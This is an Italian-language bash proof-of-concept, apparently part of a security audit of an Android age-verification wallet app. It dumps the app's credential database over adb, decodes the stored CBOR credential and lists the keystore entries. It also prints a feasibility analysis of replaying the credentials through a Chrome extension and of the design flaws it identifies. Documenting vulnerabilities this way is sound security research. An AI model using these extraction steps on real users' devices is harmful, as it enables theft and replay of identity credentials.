#!/bin/bash
# VULN-08: Credential Replay / Chrome Extension Feasibility PoC
#
# Dimostra che le credenziali possono essere estratte, decodificate,
# e potenzialmente ripresentate fuori dall'app originale.
#
# Questo script NON crea un'estensione Chrome funzionante.
# Dimostra che i dati necessari per crearne una sono tutti accessibili.
source "$(dirname "$0")/00-common.sh"

banner "CREDENTIAL REPLAY / CHROME EXTENSION FEASIBILITY"
check_device

DUMP="/tmp/av-replay-docmanager.db"

info "Step 1: Estrazione credential database..."
$ADB shell "run-as $PKG cat $DOCDB" > "$DUMP" 2>/dev/null

DOCS=$(sqlite3 "$DUMP" "SELECT COUNT(*) FROM MzDocuments;" 2>/dev/null)
if [ "$DOCS" -eq 0 ]; then
    fail "Nessuna credenziale nel wallet. Completa un enrollment prima."
    exit 1
fi
ok "Trovati $DOCS documenti nel wallet"

info "Step 2: Estrazione dati CBOR della credenziale..."
sqlite3 "$DUMP" "SELECT id, hex(data) FROM MzDocuments LIMIT 1;" 2>/dev/null > /tmp/av-credential-hex.txt
DOC_ID=$(cut -d'|' -f1 /tmp/av-credential-hex.txt)
HEX_SIZE=$(cut -d'|' -f2 /tmp/av-credential-hex.txt | wc -c | tr -d ' ')
ok "Documento '$DOC_ID' estratto ($((HEX_SIZE/2)) bytes)"

info "Step 3: Decodifica struttura CBOR..."
python3 << 'PYEOF'
import sys

# Read hex data
with open("/tmp/av-credential-hex.txt") as f:
    line = f.read().strip()
    doc_id, hex_data = line.split("|", 1)

raw = bytes.fromhex(hex_data)

# Try to find known CBOR/JSON patterns in the binary
print(f"  Document ID: {doc_id}")
print(f"  Raw size: {len(raw)} bytes")
print()

# Extract readable strings from CBOR
strings = []
current = []
for b in raw:
    if 32 <= b < 127:
        current.append(chr(b))
    else:
        if len(current) > 4:
            strings.append("".join(current))
        current = []

print("  Stringhe leggibili nella credenziale CBOR:")
interesting = [s for s in strings if any(k in s.lower() for k in
    ["age", "over", "18", "issuer", "doc", "format", "credential", "policy",
     "europa", "eudi", "key", "curve", "algorithm", "wallet", "true", "false"])]

for s in interesting[:30]:
    print(f"    - {s}")

# Check for age_over_18 value
if "age_over_18" in hex_data.lower() or "6167655f6f7665725f3138" in hex_data.lower():
    print()
    print("  [!] Campo 'age_over_18' trovato nel payload CBOR")

# Check for key material
if "cose_key" in " ".join(strings).lower() or "EC2" in " ".join(strings):
    print("  [!] Materiale chiave trovato nel payload")

PYEOF

info "Step 4: Estrazione chiavi dal Keystore SecureArea..."
KEYS=$(sqlite3 "$DUMP" "SELECT COUNT(*) FROM MzAndroidKeystoreSecureArea;" 2>/dev/null)
info "Chiavi nel Keystore: $KEYS"

sqlite3 "$DUMP" "SELECT partitionId, id, length(data) FROM MzAndroidKeystoreSecureArea;" 2>/dev/null | while IFS='|' read -r part kid ksize; do
    echo "       Partition: $part  KeyID: $kid  Size: $ksize bytes"
done

info "Step 5: Analisi della configurazione wallet..."
echo ""
echo "  Dalla analisi del codice sorgente:"
echo ""
echo "  - userAuthenticationRequired = FALSE"
echo "    (WalletCoreConfigImpl.kt:41)"
echo "    Le chiavi possono essere usate senza autenticazione utente."
echo ""
echo "  - CredentialPolicy = OneTimeUse, 30 credenziali pre-generate"
echo "    (WalletCoreConfig.kt:198-199)"
echo "    Ogni issuance genera 30 credenziali monouso."
echo "    Una volta estratte, ognuna puo' essere presentata una volta."
echo ""
echo "  - ClientIdScheme = RedirectUri"
echo "    (WalletCoreConfigImpl.kt:47-49)"
echo "    Il verifier si identifica tramite redirect URI, non X.509."
echo "    Nessun mutual TLS, nessuna verifica dell'identita' del verifier."
echo ""

banner "ANALISI: FATTIBILITA' ESTENSIONE CHROME"

echo "  Un'estensione Chrome che bypassa la verifica richiederebbe:"
echo ""
echo "  1. CREDENTIAL DATA: Estratta da MzDocuments (fatto sopra)"
echo "     Payload CBOR firmato dall'issuer, contiene age_over_18."
echo ""
echo "  2. DEVICE KEY: Nel Keystore Android (userAuth=false)"
echo "     Su emulatore: estraibile. Su device fisico: protetta"
echo "     da hardware, MA utilizzabile senza auth utente."
echo ""
echo "  3. QR CODE DETECTION: L'estensione deve leggere il QR"
echo "     dal sito del verifier. Banale con una content script."
echo ""
echo "  4. PRESENTATION PROTOCOL: OpenID4VP con DCQL."
echo "     La risposta e' un VP Token con la credenziale firmata."
echo "     Il protocollo e' pubblico e documentato."
echo ""
echo -e "  ${RED}CONCLUSIONE:${NC}"
echo ""
echo "  La fattibilita' dipende dall'accesso alla chiave privata:"
echo ""
echo "  A) Su EMULATORE/DEVICE ROOTED:"
echo "     Tutto estraibile. Estensione pienamente funzionante."
echo ""
echo "  B) Su DEVICE FISICO non rooted:"
echo "     La chiave e' nel Keystore hardware, non estraibile."
echo "     MA: userAuthenticationRequired=false significa che"
echo "     qualsiasi app con accesso al contesto puo' firmare."
echo "     Un malware locale potrebbe presentare credenziali"
echo "     senza interazione utente."
echo ""
echo "  C) SENZA ENROLLMENT (credenziali hardcodate):"
echo "     Servirebbero credenziali firmate da un issuer trusted."
echo "     Un issuer malevolo o compromesso potrebbe emetterle."
echo "     Il test issuer le emette senza verifica d'identita'."
echo ""
echo -e "  ${YELLOW}IL DIFETTO FONDAMENTALE:${NC}"
echo ""
echo "  Anche con implementazione perfetta, il verifier riceve"
echo "  solo un booleano firmato (age_over_18 = true/false)."
echo "  Non puo' distinguere una presentazione legittima da:"
echo "  - Un replay della stessa credenziale"
echo "  - Una credenziale emessa senza verifica reale"
echo "  - Una credenziale presentata da un'entita' diversa"
echo ""
echo "  Pre-AV:  Sito -> 'Hai 18 anni?' -> Utente: 'Si'"
echo "  Post-AV: Sito -> 'Hai 18 anni?' -> App: 'Si'"
echo ""
echo "  Stessa risposta. Ma ora con dati biometrici in un server."
echo ""

banner "FILE GENERATI"
echo "  /tmp/av-replay-docmanager.db     Database completo"
echo "  /tmp/av-credential-hex.txt       Credenziale in hex"

banner "DEMO COMPLETATA"
